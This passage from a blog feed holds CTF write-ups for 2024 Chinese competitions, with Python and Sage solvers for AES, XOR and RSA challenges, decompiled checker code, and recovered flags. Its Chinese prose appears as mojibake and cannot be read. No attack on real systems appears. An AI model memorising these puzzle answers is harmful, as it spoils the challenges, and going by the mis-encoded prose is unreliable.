title="img"><p>çœ‹ä¸Šå»æœ‰ç‚¹åƒaesï¼Œfindcryptä¸€ä¸‹æœç„¶æ˜¯</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730598702867-76c4cae8-396e-475c-b938-f9eb171438b1.png" class="" title="img"><p>å½“æ—¶è§£å‡ºæ¥æ˜¯è¿™ä¸ªï¼Œæ²¡æœ‰å¤šæƒ³ä¸ºä»€ä¹ˆå‰å‡ ä½æ˜¯æ­£å¸¸çš„ï¼Œèµ›åå‘ç°æ˜¯0xbçœ‹æˆ0x8äº†ğŸ¥²</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730599195160-a385aee4-7fed-4cbc-800f-36aa0d425af4.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="hljs-keyword">import</span> Cipher, algorithms, modes<br><br>ciphertext = <span class="hljs-built_in">bytes</span>([<br>    <span class="hljs-number">0x52</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x98</span>,<br>    <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x8C</span>,<br>    <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x7F</span>,<br>    <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x72</span><br>])<br><br>key = <span class="hljs-string">&quot;5855eab53a2275d3&quot;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>iv = <span class="hljs-string">&quot;b051a57d6d05b393&quot;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><br>cipher = Cipher(algorithms.AES(key), modes.CBC(iv))<br>decryptor = cipher.decryptor()<br><br><br>plaintext = decryptor.update(ciphertext) + decryptor.finalize()<br><br><br>plaintext_list = <span class="hljs-built_in">list</span>(plaintext)<br><br><br>a=[<span class="hljs-number">0x77</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x69</span>,<span class="hljs-number">0x73</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(plaintext_list)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(plaintext_list[i]^a[i%<span class="hljs-built_in">len</span>(a)]), end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment">#726974812f6d9e532f9d838924e6c05f</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œkeyå’Œivå“ªæ€•æ˜¾ç¤ºçš„æ˜¯16è¿›åˆ¶ä¾æ—§æ˜¯utf-8æ ¼å¼</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730554990602-4587ef70-fe76-450a-b083-0c816977fa68.png" class="" title="img"><h1 id="ä¿¡åˆ›å®‰å…¨"><a href="#ä¿¡åˆ›å®‰å…¨" class="headerlink" title="ä¿¡åˆ›å®‰å…¨"></a>ä¿¡åˆ›å®‰å…¨</h1><h2 id="sm4rev-1"><a href="#sm4rev-1" class="headerlink" title="sm4rev-1"></a>sm4rev-1</h2><p>é™„ä»¶å…ˆæ˜¯shè„šæœ¬ï¼Œåç»­æ˜¯æœªçŸ¥æ–‡ä»¶</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730600720835-4edcf965-ac0a-48a8-8e5b-14cc3bf2dd44.png" class="" title="img"><p>çœ‹åˆ°dirå’Œdecompressï¼ŒçŒœæµ‹å¯èƒ½æ˜¯åœ¨è§£å‹ï¼Œäºæ˜¯ä¿®æ”¹åç¼€ä¸ºzipï¼Œè§£å‹å¾—åˆ°elf</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730600630802-91d7d1f9-a907-4f3e-8635-8d55e81af030.png" class="" title="img"><p>é¢˜ç›®æç¤ºæ˜¯sm4,å‘ç°keyå’Œiv</p><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730600562841-10d41272-3517-4edc-ba70-043adb0e9863.png" class="" title="img"><img src="/2024/11/03/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2024%E5%88%9D%E8%B5%9Bwp/1730602378970-d410599c-eef9-434d-b2de-4bef37e439fa.png" class="" title="img"><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="myez-encode-1"><a href="#myez-encode-1" class="headerlink" title="myez_encode-1"></a>myez_encode-1</h2><p>åœ¨ECCä¸Šç”Ÿæˆpqï¼Œå…¶å®æ„Ÿè§‰å’ŒECCæ²¡ä»€ä¹ˆå…³ç³»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> isprime<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_ecc_parameters</span>():<br>    x = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">512</span>)<br>    y = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">512</span>)<br>    <span class="hljs-keyword">return</span> x, y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_prime_on_curve</span>(<span class="hljs-params">x, y, a, b, ecc_p</span>):<br>    p = x<br>    q = y<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> (isprime(p) <span class="hljs-keyword">and</span> isprime(q)):<br>        p = random.randint(<span class="hljs-number">2</span>, ecc_p - <span class="hljs-number">1</span>)<br>        q = (p**<span class="hljs-number">3</span> + a * p + b) % ecc_p<br>    <span class="hljs-keyword">return</span> p, q<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_rsa_parameters</span>():<br>    a = getPrime(<span class="hljs-number">512</span>) <br>    b = getPrime(<span class="hljs-number">512</span>)   <br>    ecc_p = getPrime(<span class="hljs-number">512</span>)  <br>    x, y = generate_ecc_parameters()<br>    p, q = find_prime_on_curve(x, y, a, b, ecc_p)<br>    n = p * q<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p= <span class="hljs-subst">&#123;p&#125;</span>\nq= <span class="hljs-subst">&#123;q&#125;</span>\nn= <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;a= <span class="hljs-subst">&#123;a&#125;</span>\nb= <span class="hljs-subst">&#123;b&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;P= <span class="hljs-subst">&#123;ecc_p&#125;</span>&quot;</span>)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    generate_rsa_parameters()<br><br>n = p*q<br>e = <span class="hljs-number">9</span><br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(c)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n= 23298836191712395990541254600776262066247692725919114528027158820049802443474994576179738462067629079873633948850637889127452791527914591229415148712172587856497614285410824614070907847594399218298016379507879066220104597707859246179921731928508884947347652904142879813069359815823184922170241099916465722623</span><br><span class="hljs-string">a= 7388665644223916915334064243181348811184637180763467245762518813757790945069068654378380490110607063038613823004593920489924786053478102905200169738195523</span><br><span class="hljs-string">b= 11742940161647091720180482697980016011774828087234021441133595442949631197989696508358388255191793888646498553804646435609849154496274569000398776043150743</span><br><span class="hljs-string">P= 11300086101709077144191286182913849072593185125745291892398153828719453495325025227858328617077648296782357912556752467026523366682963139253552060862229027</span><br><span class="hljs-string">c= 9314530945343661153059846131608414257092556390479105017633636336832925597262814680689800448223193301814365726128618348603188219757245073917910487794768758461683644600756896595336654006282030911824869219015400826589122838492456940861634378619000373353637666835642505021355710338342048772713981673863167110471</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>q &#x3D; (p**3 + a * p + b) % ecc_på·¦å³ä¸¤è¾¹åŒä¹˜ä»¥pï¼Œç„¶åsageæ±‚è§£</p><p>åç»­eå’Œphiä¸äº’ç´ ï¼Œç”¨ä¸­å›½å‰©ä½™å®šç†æ±‚è§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>a = <span class="hljs-number">7388665644223916915334064243181348811184637180763467245762518813757790945069068654378380490110607063038613823004593920489924786053478102905200169738195523</span><br>b = <span class="hljs-number">11742940161647091720180482697980016011774828087234021441133595442949631197989696508358388255191793888646498553804646435609849154496274569000398776043150743</span><br>n = <span class="hljs-number">23298836191712395990541254600776262066247692725919114528027158820049802443474994576179738462067629079873633948850637889127452791527914591229415148712172587856497614285410824614070907847594399218298016379507879066220104597707859246179921731928508884947347652904142879813069359815823184922170241099916465722623</span><br>P = <span class="hljs-number">11300086101709077144191286182913849072593185125745291892398153828719453495325025227858328617077648296782357912556752467026523366682963139253552060862229027</span><br>e = <span class="hljs-number">9</span><br>c= <span class="hljs-number">9314530945343661153059846131608414257092556390479105017633636336832925597262814680689800448223193301814365726128618348603188219757245073917910487794768758461683644600756896595336654006282030911824869219015400826589122838492456940861634378619000373353637666835642505021355710338342048772713981673863167110471</span><br><br><br><span class="hljs-comment"># R.&lt;x&gt; = Zmod(P)[]</span><br><span class="hljs-comment"># f = x ^ 4 + a * x ^ 2 + b * x - n</span><br><span class="hljs-comment"># res = f.roots()</span><br><span class="hljs-comment"># print(res)#2925490712948356009205547798331037409204468852265154197929696123102317330847028997592576845375767951888373634075473448002921250636926630905567362014595493</span><br>p = <span class="hljs-number">2925490712948356009205547798331037409204468852265154197929696123102317330847028997592576845375767951888373634075473448002921250636926630905567362014595493</span><br>q = n // p<br>R.&lt;x&gt; = Zmod(p)[]<br>f = x ^ e - c<br>f = f.monic()<br>res1 = f.roots()<br><span class="hljs-built_in">print</span>(res1)<br>R.&lt;x&gt; = Zmod(q)[]<br>f = x ^ e - c<br>f = f.monic()<br>res2 = f.roots()<br><span class="hljs-built_in">print</span>(res2)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res1:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> res2:<br>        m =solve_crt([<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]),<span class="hljs-built_in">int</span>(j[<span class="hljs-number">0</span>])],[p,q])<br>        flag = long_to_bytes(m)<br>        <span class="hljs-built_in">print</span>(flag)<br>        <br><span class="hljs-comment">#DASCTF&#123;Very_easy_3NC0dE_Is_1t&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rc4é­”æ”¹</tag>
      
      <tag>åŠ¨æ€è§„åˆ’</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘é¼æ¯2024é’é¾™ç»„åˆèµ›éƒ¨åˆ†wp</title>
    <link href="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="four"><a href="#four" class="headerlink" title="four"></a>four</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">char</span> v4[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-240h] BYREF</span><br>    <span class="hljs-type">char</span> v5[<span class="hljs-number">48</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-230h] BYREF</span><br>    <span class="hljs-type">char</span> v6[<span class="hljs-number">256</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-200h] BYREF</span><br>    <span class="hljs-type">char</span> v7[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+140h] [rbp-100h] BYREF</span><br>    __int64 v8[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+150h] [rbp-F0h] BYREF</span><br>    __int64 v9[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+160h] [rbp-E0h] BYREF</span><br>    <span class="hljs-type">char</span> v10[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+170h] [rbp-D0h] BYREF</span><br>    <span class="hljs-type">char</span> v11[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+180h] [rbp-C0h] BYREF</span><br>    <span class="hljs-type">char</span> v12[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+190h] [rbp-B0h] BYREF</span><br>    <span class="hljs-type">char</span> s2[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+1A0h] [rbp-A0h] BYREF</span><br>    <span class="hljs-type">char</span> s1[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+1B0h] [rbp-90h] BYREF</span><br>    <span class="hljs-type">char</span> dest[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+1C0h] [rbp-80h] BYREF</span><br>    __int64 v16; <span class="hljs-comment">// [rsp+1D0h] [rbp-70h] BYREF</span><br>    _BYTE v17[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+1D8h] [rbp-68h] BYREF</span><br>    <span class="hljs-type">char</span> s[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [rsp+1F0h] [rbp-50h] BYREF</span><br>    _BYTE v19[<span class="hljs-number">41</span>]; <span class="hljs-comment">// [rsp+1F7h] [rbp-49h] BYREF</span><br>    <span class="hljs-type">char</span> *v20; <span class="hljs-comment">// [rsp+220h] [rbp-20h]</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v21; <span class="hljs-comment">// [rsp+228h] [rbp-18h]</span><br>    <span class="hljs-type">int</span> k; <span class="hljs-comment">// [rsp+234h] [rbp-Ch]</span><br>    <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+238h] [rbp-8h]</span><br>    <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+23Ch] [rbp-4h]</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the flag:&quot;</span>);<br>    <span class="hljs-keyword">if</span> ( fgets(s, <span class="hljs-number">41</span>, <span class="hljs-built_in">stdin</span>) )<br>        s[<span class="hljs-built_in">strcspn</span>(s, <span class="hljs-string">&quot;\n&quot;</span>)] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(s) != <span class="hljs-number">40</span> || <span class="hljs-built_in">strncmp</span>(s, <span class="hljs-string">&quot;wdflag&#123;&quot;</span>, <span class="hljs-number">7uLL</span>) || v19[<span class="hljs-number">32</span>] != <span class="hljs-number">125</span> )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">memcpy</span>(dest, v19, <span class="hljs-number">0x20</span>uLL);<br>    v17[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;<br>    s2[<span class="hljs-number">0</span>] = <span class="hljs-number">114</span>;<br>    s2[<span class="hljs-number">1</span>] = <span class="hljs-number">0xCA</span>;<br>    s2[<span class="hljs-number">2</span>] = <span class="hljs-number">112</span>;<br>    s2[<span class="hljs-number">3</span>] = <span class="hljs-number">106</span>;<br>    s2[<span class="hljs-number">4</span>] = <span class="hljs-number">106</span>;<br>    s2[<span class="hljs-number">5</span>] = <span class="hljs-number">-60</span>;<br>    s2[<span class="hljs-number">6</span>] = <span class="hljs-number">-62</span>;<br>    s2[<span class="hljs-number">7</span>] = <span class="hljs-number">-54</span>;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">7</span>; ++i )<br>        s1[i] = <span class="hljs-number">2</span> * dest[i];<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(s1, s2, <span class="hljs-number">8uLL</span>) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    v21 = <span class="hljs-string">&quot;XorrLord&quot;</span>;<br>    qmemcpy(v11, <span class="hljs-string">&quot;`\tK&quot;</span>, <span class="hljs-number">3</span>);<br>    v11[<span class="hljs-number">3</span>] = <span class="hljs-number">19</span>;<br>    v11[<span class="hljs-number">4</span>] = <span class="hljs-number">45</span>;<br>    v11[<span class="hljs-number">5</span>] = <span class="hljs-number">14</span>;<br>    v11[<span class="hljs-number">6</span>] = <span class="hljs-number">20</span>;<br>    v11[<span class="hljs-number">7</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">8</span>; j &lt;= <span class="hljs-number">15</span>; ++j )<br>        v12[j - <span class="hljs-number">8</span>] = dest[j] ^ v21[j - <span class="hljs-number">8</span>];<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(v12, v11, <span class="hljs-number">8uLL</span>) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    base64_encode(&amp;v16, <span class="hljs-number">8LL</span>, v10);<br>    v20 = <span class="hljs-string">&quot;QYGyBYKyA2K&quot;</span>;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strcmp</span>(v10, <span class="hljs-string">&quot;QYGyBYKyA2K&quot;</span>) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    qmemcpy(v9, <span class="hljs-string">&quot;AesMasterAesMast&quot;</span>, <span class="hljs-keyword">sizeof</span>(v9));<br>    v8[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>    v8[<span class="hljs-number">1</span>] = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-built_in">memcpy</span>(v8, v17, <span class="hljs-number">8uLL</span>);<br>    <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">8</span>; k &lt;= <span class="hljs-number">15</span>; ++k )<br>        *((_BYTE *)v8 + k) = <span class="hljs-number">8</span>;<br>    AES_set_encrypt_key(v9, <span class="hljs-number">128LL</span>, v6);<br>    AES_encrypt(v8, v7, v6);<br>    hex_to_string(v7, <span class="hljs-number">16LL</span>, v5);<br>    v4[<span class="hljs-number">0</span>] = <span class="hljs-number">-67</span>;<br>    v4[<span class="hljs-number">1</span>] = <span class="hljs-number">-11</span>;<br>    v4[<span class="hljs-number">2</span>] = <span class="hljs-number">89</span>;<br>    v4[<span class="hljs-number">3</span>] = <span class="hljs-number">-122</span>;<br>    v4[<span class="hljs-number">4</span>] = <span class="hljs-number">57</span>;<br>    v4[<span class="hljs-number">5</span>] = <span class="hljs-number">68</span>;<br>    v4[<span class="hljs-number">6</span>] = <span class="hljs-number">52</span>;<br>    v4[<span class="hljs-number">7</span>] = <span class="hljs-number">96</span>;<br>    v4[<span class="hljs-number">8</span>] = <span class="hljs-number">-120</span>;<br>    v4[<span class="hljs-number">9</span>] = <span class="hljs-number">-15</span>;<br>    v4[<span class="hljs-number">10</span>] = <span class="hljs-number">109</span>;<br>    v4[<span class="hljs-number">11</span>] = <span class="hljs-number">-60</span>;<br>    v4[<span class="hljs-number">12</span>] = <span class="hljs-number">25</span>;<br>    v4[<span class="hljs-number">13</span>] = <span class="hljs-number">-33</span>;<br>    v4[<span class="hljs-number">14</span>] = <span class="hljs-number">-125</span>;<br>    v4[<span class="hljs-number">15</span>] = <span class="hljs-number">6</span>;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">memcmp</span>(v7, v4, <span class="hljs-number">0x10</span>uLL) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Correct Flag!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¨‹åºé€»è¾‘æ˜ç¡®ï¼Œ3ä¸ºbase64ï¼Œ4ä¸ºaes</p><img src="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1730165711490-c8800a74-0c30-4057-8484-33de35c16402.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">114</span>,<span class="hljs-number">0xca</span>,<span class="hljs-number">112</span>,<span class="hljs-number">106</span>,<span class="hljs-number">106</span>,<span class="hljs-number">0xc4</span>,<span class="hljs-number">0xc2</span>,<span class="hljs-number">0xca</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i]//=<span class="hljs-number">2</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br>a1=[<span class="hljs-number">0x60</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0x4b</span>,<span class="hljs-number">19</span>,<span class="hljs-number">45</span>,<span class="hljs-number">14</span>,<span class="hljs-number">20</span>,<span class="hljs-number">1</span>]<br>s2=<span class="hljs-string">&quot;XorrLord&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a1)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(a1[i]^<span class="hljs-built_in">ord</span>(s2[i])),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;9a2eb2cb&#x27;</span>,end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;d8823519&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="easystd-1"><a href="#easystd-1" class="headerlink" title="easystd-1"></a>easystd-1</h2><p>çœ‹å¯¹è±¡aå’Œb</p><img src="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1730199617648-0249c309-17b2-4822-9bd4-321ab9627578.png" class="" title="img"><img src="/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1730192520569-3676fca0-6765-46d6-a150-18426601a30d.png" class="" title="img"><p>check1åœ¨nativeå±‚</p><img 